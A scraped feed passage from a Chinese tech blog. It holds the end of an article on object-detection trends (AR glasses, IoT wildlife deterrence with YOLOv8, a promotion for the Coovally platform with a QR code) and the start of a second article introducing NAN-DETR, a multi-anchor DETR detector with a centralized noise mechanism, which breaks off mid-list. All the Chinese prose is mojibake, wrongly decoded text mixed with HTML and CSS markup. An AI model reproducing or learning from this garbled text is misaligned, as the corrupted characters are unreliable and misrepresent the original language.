<li><strong>å¢å¼ºç°å®ä¸æ—¥å¸¸ç”Ÿæ´»ä¸­çš„ç›®æ ‡æ£€æµ‹</strong></li>
</ul>
<p>åœ¨ç¹å¿™çš„ä»“åº“å’Œå¤§å‹é›¶å”®åœºæ‰€ï¼Œå·¥ä½œäººå‘˜ç»å¸¸éœ€è¦åŒæ—¶å¤„ç†å¤šé¡¹ä»»åŠ¡ã€‚å¢å¼ºç°å®é€šè¿‡å°†æ•°å­—æŒ‡å¼•ç›´æ¥å åŠ åˆ°ç°å®ä¸–ç•Œä¸­æ¥æä¾›å¸®åŠ©ã€‚å½“ä¸ç›®æ ‡æ£€æµ‹ç»“åˆæ—¶ï¼ŒARç³»ç»Ÿå¯ä»¥è¯†åˆ«ç‰©å“ã€è¿½è¸ªå…¶ä½ç½®ï¼Œå¹¶å®æ—¶æ˜¾ç¤ºæœ‰ç”¨ä¿¡æ¯ã€‚è¿™ä½¿å¾—æ—¥å¸¸ä»»åŠ¡å¯¹ä½¿ç”¨è€…æ¥è¯´æ›´è½»æ¾ã€æ›´å¿«é€Ÿã€æ›´ç›´è§‚ã€‚</p>
<p>è¯¥é¢†åŸŸçš„ä¸€ä¸ªå¢é•¿è¶‹åŠ¿æ˜¯ä½¿ç”¨è§†è§‰AIå°†æ—¥å¸¸è®¾å¤‡è½¬å˜ä¸ºèƒ½å¤Ÿç†è§£å‘¨å›´ç¯å¢ƒçš„æ™ºèƒ½åŠ©æ‰‹ã€‚éšç€ARå’Œç›®æ ‡æ£€æµ‹çš„ä¸æ–­èåˆï¼Œå·¥ä½œåœºæ‰€æ­£å¼€å§‹é‡‡ç”¨æ²‰æµ¸å¼å·¥å…·æ¥æ”¯æŒå…æ‰‹åŠ¨æŒ‡å¼•å’Œæ›´é«˜æ•ˆçš„å·¥ä½œæµç¨‹ã€‚</p>
<p>ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯äºšé©¬é€Šæ­£åœ¨å¼€å‘å’Œæµ‹è¯•çš„AIå¢å¼ºç°å®çœ¼é•œã€‚è¿™äº›çœ¼é•œåˆ©ç”¨ç›®æ ‡æ£€æµ‹å’Œå›¾åƒåˆ†ç±»æ¥è¯†åˆ«åŒ…è£¹ã€å¼•å¯¼å·¥äººæ²¿æ­£ç¡®è·¯çº¿è¡Œè¿›å¹¶è®°å½•é€è¾¾è¯æ˜ã€‚è¿™åˆ›é€ äº†ä¸€ç§æ›´å®‰å…¨ã€è§£æ”¾åŒæ‰‹çš„ä½“éªŒï¼Œå¸®åŠ©å·¥äººåœ¨å…¨å¤©å·¥ä½œä¸­ä¿æŒä¸“æ³¨å’Œé«˜æ•ˆã€‚</p>
<ul>
<li><strong>ç‰©è”ç½‘é©±åŠ¨çš„æ™ºèƒ½è®¾å¤‡ï¼Œæ„å»ºå®æ—¶è§†è§‰ç³»ç»Ÿ</strong></li>
</ul>
<p>æ™ºèƒ½è®¾å¤‡å·²æ¼”å˜æˆèƒ½å¤Ÿè§‚å¯Ÿã€ç†è§£å¹¶å¯¹å‘¨å›´ç¯å¢ƒåšå‡ºååº”çš„æ™ºèƒ½ç³»ç»Ÿã€‚ç‰©è”ç½‘é€šè¿‡å°†æ‘„åƒå¤´ã€ä¼ æ„Ÿå™¨ã€æœºå™¨å’Œæ™ºèƒ½åº”ç”¨è¿æ¥æˆèƒ½å¤Ÿæ”¶é›†å¹¶å¯¹æ•°æ®è¿›è¡Œå®æ—¶å¤„ç†çš„ç½‘ç»œï¼Œæ¨åŠ¨äº†è¿™ä¸€è½¬å˜ã€‚</p>
<p>å½“ç‰©è”ç½‘ä¸ç›®æ ‡æ£€æµ‹å’Œè¾¹ç¼˜è®¡ç®—ååŒå·¥ä½œæ—¶ï¼Œè®¾å¤‡å¯ä»¥è§£è¯»è§†è§‰ä¿¡æ¯ã€å‘ç°å¼‚å¸¸å¹¶å³æ—¶åšå‡ºå“åº”ï¼Œæ— éœ€äººå·¥å¹²é¢„ã€‚è¿™åˆ›é€ äº†è‡ªé€‚åº”ä¸”é«˜æ•ˆçš„ç³»ç»Ÿï¼Œä¸ºæ™ºèƒ½å®¶å±…ã€å·¥ä¸šå’Œæ•´ä¸ªæ™ºæ…§åŸå¸‚æä¾›åŠ¨åŠ›ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæœ€è¿‘çš„ä¸€é¡¹ç ”ç©¶è¡¨æ˜ï¼Œä¸€ä¸ªåŸºäºç‰©è”ç½‘çš„é‡ç”ŸåŠ¨ç‰©ä¿æŠ¤ç³»ç»Ÿå¦‚ä½•ä½¿ç”¨YOLOv8æ¥æ£€æµ‹æ¥è¿‘å†œç”°çš„åŠ¨ç‰©ã€‚ä¸€æ—¦æ£€æµ‹åˆ°ï¼Œè¯¥ç³»ç»Ÿä¼šåˆ©ç”¨AIé©±åŠ¨çš„å†³ç­–æ¥è§¦å‘ç¯å…‰æˆ–å£°éŸ³ç­‰æ¸©å’Œçš„å¨æ…‘æ‰‹æ®µï¼Œå®‰å…¨åœ°å°†åŠ¨ç‰©å¼•å¼€ã€‚è¿™æœ‰åŠ©äºé˜²æ­¢å†œä½œç‰©å—æŸï¼ŒåŒæ—¶æ”¯æŒä¸å½“åœ°é‡ç”ŸåŠ¨ç‰©çš„å’Œå¹³å…±å¤„ï¼Œå±•ç¤ºäº†ç‰©è”ç½‘å’Œè®¡ç®—æœºè§†è§‰å¦‚ä½•ä½¿å†œä¸šæ›´å…·å¯æŒç»­æ€§ã€‚</p>
<p>Coovally æä¾›äº†å¼€ç®±å³ç”¨çš„æ¨¡å‹ä»“åº“ã€ç»Ÿä¸€çš„è¯„ä¼°åŸºå‡†ä»¥åŠäº‘ç«¯ç®—åŠ›æ”¯æŒï¼Œè®©å¼€å‘è€…èƒ½å¿«é€Ÿå®éªŒå¹¶æ‰¾åˆ°æœ€é€‚åˆå…¶åº”ç”¨åœºæ™¯çš„è§£å†³æ–¹æ¡ˆï¼Œæå¤§é™ä½äº†å…ˆè¿›è®¡ç®—æœºè§†è§‰æŠ€æœ¯çš„åº”ç”¨é—¨æ§›ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dce7047cba9547ef971554cab85d0f88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=vuY6v6%2FSaoPRO098BFns9%2B54w6c%3D" alt="Coovallyæ“ä½œåŠ¨å›¾.gif" loading="lazy"/></p>
<p>å½“è®©å¦‚æœä½ æ˜¯æŠ€æœ¯å°ç™½ï¼Œ<strong>éœ€è¦AIç®—æ³•</strong>ï¼Œæˆ–æ˜¯éœ€è¦<strong>AIè§£å†³æ–¹æ¡ˆ</strong>çš„æœ‹å‹ï¼Œå¯ä»¥æ‰«æäºŒç»´ç ï¼Œæˆ‘ä»¬æ¥ç»™ä½ æä¾›è§£å†³æ–¹æ¡ˆï¼ï¼</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3497fdda30d24fbd87068e6ea873261f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878328&amp;x-signature=GyR%2BhWOczwXn7OGLIvponv4mnqo%3D" alt="å°åŠ©æ‰‹äºŒç»´ç .png" loading="lazy"/></p>
<p>ç‚¹å‡»<strong>é˜…è¯»åŸæ–‡</strong>ï¼Œå³å¯ä½“éªŒCoovallyå¹³å°ï¼</p>
<h2 data-id="heading-4"><strong>å…¶ä»–å€¼å¾—å…³æ³¨çš„è§†è§‰AIè¶‹åŠ¿</strong></h2>
<p>é™¤äº†è¿™ä¸ƒå¤§ç›®æ ‡æ£€æµ‹è¶‹åŠ¿ï¼Œä»¥ä¸‹è¿˜æœ‰ä¸€äº›æ­£åœ¨å¡‘é€ è§†è§‰AIæœªæ¥çš„é‡è¦å‘å±•ï¼š</p>
<ul>
<li><strong>è‡ªç›‘ç£å­¦ä¹ ç ”ç©¶ï¼š</strong> æ–°çš„æ·±åº¦å­¦ä¹ æ–¹æ³•è®©æ¨¡å‹èƒ½å¤Ÿä»å¤§é‡æœªæ ‡æ³¨çš„å›¾åƒé›†ä¸­å­¦ä¹ æœ‰ç”¨çš„è§†è§‰ç‰¹å¾ï¼Œå¸®åŠ©ç›®æ ‡æ£€æµ‹ç³»ç»Ÿåœ¨ä¸è¿‡åº¦ä¾èµ–äººå·¥æ ‡æ³¨çš„æƒ…å†µä¸‹å¾—åˆ°æ”¹è¿›ã€‚</li>
<li><strong>åŸºäºTransformerçš„ç›®æ ‡æ£€æµ‹å…´èµ·ï¼š</strong> Transformeræ­£å˜å¾—è¶Šæ¥è¶Šæ™®éï¼Œå› ä¸ºå®ƒä»¬èƒ½æ•æ‰å›¾åƒå†…çš„é•¿è·ç¦»å…³è”ï¼Œèµ‹äºˆæ¨¡å‹æ›´å¥½çš„ä¸Šä¸‹æ–‡ç†è§£èƒ½åŠ›ï¼Œä»è€Œæé«˜æ£€æµ‹ç²¾åº¦ã€‚</li>
<li><strong>é›†æˆæ¿€å…‰é›·è¾¾ä»¥è·å–æ›´ä¸°å¯Œçš„3Dæ„ŸçŸ¥ï¼š</strong> å°†æ¿€å…‰é›·è¾¾ä¸åŸºäºæ‘„åƒå¤´çš„ç›®æ ‡æ£€æµ‹ç»“åˆï¼Œå¯æä¾›ç²¾ç¡®çš„æ·±åº¦ä¿¡æ¯ï¼Œä»è€ŒåŠ å¼ºç”¨äºå¯¼èˆªã€æœºå™¨äººæŠ€æœ¯å’Œè‡ªåŠ¨é©¾é©¶ç­‰åº”ç”¨çš„3Dæ„ŸçŸ¥èƒ½åŠ›ã€‚</li>
</ul>
<h2 data-id="heading-5"><strong>æ€»ç»“</strong></h2>
<p>ç›®æ ‡æ£€æµ‹æ—©å·²è¶…è¶Šäº†åŸºæœ¬çš„å›¾åƒè¯†åˆ«ï¼Œå¦‚ä»Šè¢«ç”¨äºé©±åŠ¨èƒ½å¤Ÿåœ¨å®æ—¶å†³ç­–çš„æ™ºèƒ½ç³»ç»Ÿã€‚å±•æœ›æœªæ¥ï¼Œæ–°ä¸€ä»£çš„æ¨¡å‹å¯èƒ½ä¼šå®ç°æ›´é«˜çš„å‡†ç¡®åº¦å’Œæ›´æ·±åº¦çš„ä¸Šä¸‹æ–‡ç†è§£ï¼Œä½¿è§†è§‰AIåœ¨å„ä¸ªè¡Œä¸šä¸­å˜å¾—æ›´åŠ å¯é å’Œå¤šåŠŸèƒ½ã€‚éšç€è¿™äº›æŠ€æœ¯çš„ä¸æ–­è¿›æ­¥ï¼Œå®ƒä»¬å°†å¡‘é€ å‡ºæ–°ä¸€ä»£æ›´æ™ºèƒ½ã€é€‚åº”æ€§æ›´å¼ºçš„è®¡ç®—æœºè§†è§‰ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[NAN-DETRï¼šé›†ä¸­å¼å™ªå£°æœºåˆ¶å¦‚ä½•è®©æ£€æµ‹æ›´â€œå›¢ç»“â€ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581664445241065487</link>    <guid>https://juejin.cn/post/7581664445241065487</guid>    <pubDate>2025-12-09T09:49:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581664445241065487" data-draft-id="7581688255624822836" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="NAN-DETRï¼šé›†ä¸­å¼å™ªå£°æœºåˆ¶å¦‚ä½•è®©æ£€æµ‹æ›´â€œå›¢ç»“â€ï¼Ÿ"/> <meta itemprop="keywords" content="ç®—æ³•,è®¡ç®—æœºè§†è§‰,æ·±åº¦å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-09T09:49:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoovallyAIHub"/> <meta itemprop="url" content="https://juejin.cn/user/2461151071843739"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            NAN-DETRï¼šé›†ä¸­å¼å™ªå£°æœºåˆ¶å¦‚ä½•è®©æ£€æµ‹æ›´â€œå›¢ç»“â€ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2461151071843739/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoovallyAIHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T09:49:00.000Z" title="Tue Dec 09 2025 09:49:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç›®æ ‡æ£€æµ‹æ˜¯æœºå™¨äººè§†è§‰é¢†åŸŸçš„æ ¸å¿ƒæŠ€æœ¯ï¼Œå®ƒä¸ä»…è¦è¯†åˆ«å‡ºå›¾åƒä¸­æœ‰ä»€ä¹ˆç‰©ä½“ï¼Œè¿˜è¦ç²¾ç¡®åœ°å®šä½å®ƒä»¬çš„ä½ç½®ã€‚éšç€è‡ªåŠ¨é©¾é©¶ã€æ™ºèƒ½ç›‘æ§ã€å·¥ä¸šè´¨æ£€ç­‰åº”ç”¨çš„å¿«é€Ÿå‘å±•ï¼Œå¯¹ç›®æ ‡æ£€æµ‹çš„ç²¾åº¦å’Œé²æ£’æ€§æå‡ºäº†è¶Šæ¥è¶Šé«˜çš„è¦æ±‚ã€‚</p>
<p>ä¼ ç»Ÿçš„ç›®æ ‡æ£€æµ‹æ–¹æ³•ï¼Œå¦‚R-CNNç³»åˆ—ï¼Œè™½ç„¶å–å¾—äº†æ˜¾è‘—æˆæœï¼Œä½†å¾€å¾€ä¾èµ–äºå¤æ‚çš„åå¤„ç†ï¼ˆå¦‚éæå¤§å€¼æŠ‘åˆ¶NMSï¼‰å’Œæ‰‹å·¥è®¾è®¡çš„é”šæ¡†ï¼Œé™åˆ¶äº†å…¶æ•ˆç‡å’Œæ³›åŒ–èƒ½åŠ›ã€‚</p>
<p>2020å¹´ï¼ŒDETRï¼ˆDetection Transformerï¼‰çš„å‡ºç°ä¸ºè¿™ä¸€é¢†åŸŸå¸¦æ¥äº†é©å‘½æ€§çš„æ”¹å˜ã€‚å®ƒå°†ç›®æ ‡æ£€æµ‹è§†ä¸ºä¸€ä¸ªé›†åˆé¢„æµ‹é—®é¢˜ï¼Œåˆ©ç”¨Transformeræ¶æ„å®ç°ç«¯åˆ°ç«¯è®­ç»ƒï¼Œæ— éœ€NMSç­‰å¤æ‚ç»„ä»¶ã€‚ç„¶è€Œï¼ŒDETRä¹Ÿå­˜åœ¨<strong>æ”¶æ•›æ…¢ã€ä¸€å¯¹ä¸€åŒ¹é…ç›‘ç£ä¿¡å·ç¨€ç–</strong>ç­‰é—®é¢˜ã€‚</p>
<p>ä¸ºäº†åº”å¯¹è¿™äº›æŒ‘æˆ˜ï¼Œæˆ‘ä»¬æå‡ºäº†NAN-DETRï¼ˆNoise-Aware Multi-Anchor DETRï¼‰ï¼Œä¸€ä¸ªåœ¨ç²¾åº¦ä¸Šå®ç°æ˜¾è‘—çªç ´çš„åˆ›æ–°æ¡†æ¶ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/141c6076e5474d73998ec81000969355~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=bTsNl84vxfxL4dvfxay9E357Mws%3D" alt="å›¾ç‰‡1.png" loading="lazy"/></p>
<p>NAN-DETRåœ¨DETRæ¡†æ¶çš„åŸºç¡€ä¸Šè¿›è¡Œäº†å¤šé¡¹å…³é”®åˆ›æ–°ï¼Œæ—¨åœ¨æå‡æ£€æµ‹ç²¾åº¦ã€‚è¯¥æ¶æ„åŒ…å«ä¸€ä¸ªéª¨å¹²ç½‘ç»œã€ä¸€ä¸ª Transformer ç¼–ç å™¨ã€å¤šä¸ª Transformer è§£ç å™¨ä»¥åŠé¢„æµ‹å¤´ï¼Œæœ€ç»ˆè¾“å‡ºæ£€æµ‹ç»“æœï¼Œå¦‚å›¾ 1 æ‰€ç¤ºã€‚è¯¥è¿‡ç¨‹é¦–å…ˆå°†å›¾åƒè¾“å…¥åˆ°éª¨å¹²ç½‘ç»œï¼Œä¾‹å¦‚ResNetæˆ– Swin-Transformerï¼Œä»¥æå–å…¨å±€ç‰¹å¾ã€‚è¿™äº›ç‰¹å¾ä¸ç”¨äºæ•æ‰ç©ºé—´å…³ç³»çš„åµŒå…¥ä½ç½®ç›¸ç»“åˆï¼Œéšåç”± Transformer ç¼–ç å™¨è¿›è¡Œå¤„ç†ï¼Œå°†å›¾åƒåˆ†å‰²æˆå¤šä¸ªåŒºåŸŸï¼ˆæŸ¥è¯¢ï¼‰ã€‚æ¯ä¸ªæŸ¥è¯¢éƒ½é€šè¿‡ç¥ç»ç½‘ç»œç”Ÿæˆåˆå§‹é”šæ¡†ã€‚ç„¶åï¼Œè¿™äº›é”šæ¡†ç”±k ä¸ªç‹¬ç«‹çš„è§£ç å™¨è¿›è¡Œå±€éƒ¨ä¼˜åŒ–ï¼Œä»¥æ›´å¥½åœ°æ£€æµ‹ç›®æ ‡ã€‚è¯¥ç­–ç•¥ç§°ä¸ºåŸºäºè§£ç å™¨çš„å¤šé”šæ¡†ç­–ç•¥ã€‚ä¸ºäº†å‡å°‘å¤šä¸ªé”šæ¡†ä¹‹é—´çš„å†²çªï¼Œåœ¨è®¡ç®—åå¯¹å®ƒä»¬è¿›è¡Œæ‰°åŠ¨ï¼Œä¸­å¿ƒåŒ–å™ªå£°æœºåˆ¶ã€‚æœ€åï¼ŒåŒ¹é…è¿‡ç¨‹ç±»ä¼¼äº DETRï¼Œä½†å¼•å…¥äº† CIoUä»¥æé«˜é”šæ¡†ä¹‹é—´ç›¸ä¼¼æ€§çš„ç²¾ç¡®åº¦é‡å¹¶ä¼˜åŒ–æ£€æµ‹ç»“æœ</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b1ba561da204c49937d1c40c3bc204e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=Vhm98eHJXkQt0maWY38awc9K7VY%3D" alt="å›¾ç‰‡2.png" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>NAN-DETRçš„æ ¸å¿ƒåˆ›æ–°ï¼šä¸‰å¤§æ³•å®</strong></h2>
<p>NAN-DETRçš„æˆåŠŸå¾—ç›Šäºä¸‰é¡¹å…³é”®æŠ€æœ¯çš„ååŒä½œç”¨ï¼š</p>
<ul>
<li><strong>åŸºäºè§£ç å™¨çš„å¤šé”šç‚¹ç­–ç•¥ï¼šè®©æ£€æµ‹æ›´å…¨é¢</strong></li>
</ul>
<p>åœ¨åŸå§‹DETRä¸­ï¼Œæ¯ä¸ªæŸ¥è¯¢ï¼ˆqueryï¼‰åªäº§ç”Ÿä¸€ä¸ªé¢„æµ‹æ¡†ã€‚è¿™å°±åƒè®©ä¸€ä¸ªä¾¦æŸ¥å‘˜åªæŠ¥å‘Šä¸€ä¸ªå«Œç–‘ç›®æ ‡çš„ä½ç½®ï¼Œå¯èƒ½ä¼šé—æ¼ä¿¡æ¯ã€‚</p>
<p>NAN-DETRå¼•å…¥äº†<strong>å¤šä¸ªç‹¬ç«‹çš„è§£ç å™¨</strong>ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œæˆ‘ä»¬ä¸æ˜¯æ´¾ä¸€ä¸ªä¾¦æŸ¥å‘˜ï¼Œè€Œæ˜¯æ´¾å‡ºä¸€æ”¯ä¾¦æŸ¥å°é˜Ÿï¼ˆkä¸ªè§£ç å™¨ï¼‰ã€‚æ¯ä¸ªé˜Ÿå‘˜éƒ½ä»åŒä¸€åˆå§‹çº¿ç´¢ï¼ˆç¼–ç å™¨è¾“å‡ºçš„æŸ¥è¯¢ï¼‰å‡ºå‘ï¼Œä½†å‡­å€Ÿå„è‡ªçš„ç»éªŒå’Œè§†è§’ï¼Œå¯¹ç›®æ ‡çš„ä½ç½®è¿›è¡Œç‹¬ç«‹åˆ†æå’Œ refinementï¼Œæœ€ç»ˆæŠ¥å‘Šå¤šä¸ªå¯èƒ½çš„ä½ç½®ï¼ˆé”šæ¡†ï¼‰ã€‚</p>
<p>è¿™ç§â€œä¸€å¯¹å¤šâ€çš„ç­–ç•¥æ˜¾è‘—æé«˜äº†æ¨¡å‹æ•æ‰ä¸åŒå°ºåº¦ã€ä¸åŒä½ç½®ç›®æ ‡çš„èƒ½åŠ›ï¼Œå°¤å…¶æ˜¯åœ¨ç‰©ä½“å°ºå¯¸å˜åŒ–å¤§çš„å¤æ‚åœºæ™¯ä¸­ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ebf3e4310d455cb155c634ef05c86a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=KHKY4QOIkPL%2BsWhXjhpo8V3aCN4%3D" alt="å›¾ç‰‡3.png" loading="lazy"/></p>
<ul>
<li><strong>é›†ä¸­å¼å™ªå£°æœºåˆ¶ï¼šè®©é”šç‚¹æ›´â€œå›¢ç»“â€ï¼Œå‡å°‘å†…è€—</strong></li>
</ul>
<p>å¤šä¸ªé”šç‚¹å¸¦æ¥äº†æ›´å…¨é¢çš„ä¿¡æ¯ï¼Œä½†ä¹Ÿå¯èƒ½å¼•å‘æ–°é—®é¢˜ï¼šå¦‚æœè¿™äº›é”šç‚¹â€œå„è‡ªä¸ºæ”¿â€ï¼ŒæŒ‡å‘å®Œå…¨ä¸åŒçš„æ–¹å‘ï¼Œåè€Œä¼šæ··æ·†æ¨¡å‹çš„åˆ¤æ–­ã€‚</p>
<p>ä¸ºäº†è§£å†³å¤šé”šç‚¹é—´çš„æ½œåœ¨å†²çªï¼Œæˆ‘ä»¬è®¾è®¡äº†<strong>é›†ä¸­å¼å™ªå£°æœºåˆ¶</strong>ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³å¾ˆå·§å¦™ï¼šæˆ‘ä»¬ä¸æ˜¯å¯¹æ¯ä¸ªé”šç‚¹æ–½åŠ å®Œå…¨éšæœºçš„å™ªå£°ï¼Œè€Œæ˜¯è®©å®ƒä»¬æœ‰ç»„ç»‡åœ°å‘ä¸­å¿ƒé æ‹¢ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/306a9b9656134c84b778d1361555f459~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29vdmFsbHlBSUh1Yg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765878540&amp;x-signature=GWXxkEbccwzgCClDZZ0NZxR%2FIKE%3D" alt="å›¾ç‰‡4.png" loading="lazy"/></p>
<p>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
